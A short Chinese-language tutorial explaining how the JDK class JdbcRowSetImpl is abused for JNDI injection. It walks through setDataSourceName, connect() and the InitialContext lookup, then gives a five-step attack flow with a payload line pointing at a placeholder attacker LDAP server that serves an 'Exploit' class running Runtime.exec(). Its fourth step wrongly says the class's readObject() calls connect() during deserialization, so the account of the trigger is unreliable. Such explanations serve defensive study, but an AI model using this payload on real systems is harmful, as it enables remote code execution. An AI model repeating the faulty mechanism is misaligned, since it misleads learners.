### JdbcRowSetImpl 如何触发的 JNDI 注入

**1. 核心原理：`setDataSourceName()` 与 JNDI**

`com.sun.rowset.JdbcRowSetImpl` 是一个 JDK 自带的类，它实现了 `RowSet` 接口。`JdbcRowSetImpl` 的一个核心功能就是通过 **`DataSource`** 来连接数据库

- **`DataSource`**：`DataSource` 是一个标准的 Java 接口，用于获取数据库连接。它通常通过 JNDI来查找和绑定
- **`setDataSourceName()`**：当调用 `JdbcRowSetImpl` 的 `setDataSourceName()` 方法时，它会设置一个 JNDI 查找名称
- **`connect()`**：当 `JdbcRowSetImpl` 尝试建立连接时，会调用 `connect()` 方法，这个方法会使用 `InitialContext` 类，对 `setDataSourceName()` 设置的名称进行 JNDI 查找

**问题的关键在于**：当 `InitialContext` 查找的 URL 指向一个**远程的 RMI/LDAP 服务器**时，它会**自动下载并加载**服务器上绑定的 Java 对象

**2. 漏洞触发的完整过程**

攻击者就是利用这一点，将恶意服务器的地址作为 `DataSourceName`，让目标服务器在反序列化时，主动去下载和执行恶意代码

1. **攻击者搭建恶意服务**：
   - 攻击者首先需要搭建一个恶意的 **LDAP 或 RMI 服务器**
   - 在这个服务器上，攻击者会绑定一个恶意的 Java 对象。这个对象通常是一个**`Exploit.java`**文件，它包含了一个 `static` 静态代码块，可以在被加载时自动执行，例如执行 `Runtime.exec()` 命令
2. **构造恶意 Payload**：
   - 攻击者构造一个恶意的序列化 `JdbcRowSetImpl` 对象
   - 在这个对象中，攻击者会利用反射等方法，将 `DataSourceName` 属性设置为恶意服务的地址
   - 例如：`new JdbcRowSetImpl().setDataSourceName("ldap://<攻击机IP>:<端口>/Exploit")`
   - **注意**：这里的 `ldap://` 是 JNDI 查找的协议，`<攻击机IP>` 是攻击者服务器的地址，`Exploit` 是攻击者在服务器上绑定的恶意对象名
3. **发送 Payload**：
   - 攻击者将这个序列化后的 `JdbcRowSetImpl` 对象发送给存在反序列化漏洞的目标应用程序
   - 这个过程可以是通过 HTTP 请求、文件上传或其他方式
4. **目标服务器反序列化**：
   - 目标应用程序接收到数据后，对 `JdbcRowSetImpl` 对象进行反序列化
   - 在反序列化过程中，`JdbcRowSetImpl` 的 `readObject()` 方法被调用
   - `readObject()` 方法会触发 `connect()` 方法的调用
5. **触发 JNDI 注入**：
   - `connect()` 方法会使用 `InitialContext` 对恶意地址 `ldap://<攻击机IP>:<端口>/Exploit` 进行 JNDI 查找
   - 由于 `java.naming.factory.initial` 等配置，或者因为 JDK 版本过低，JVM 会无条件信任远程查找的结果
   - JVM 会连接到攻击者的 LDAP 服务器，下载并加载 `Exploit` 这个恶意对象
   - 当 `Exploit` 对象被加载到内存时，其静态代码块会自动执行，从而执行攻击者预设的系统命令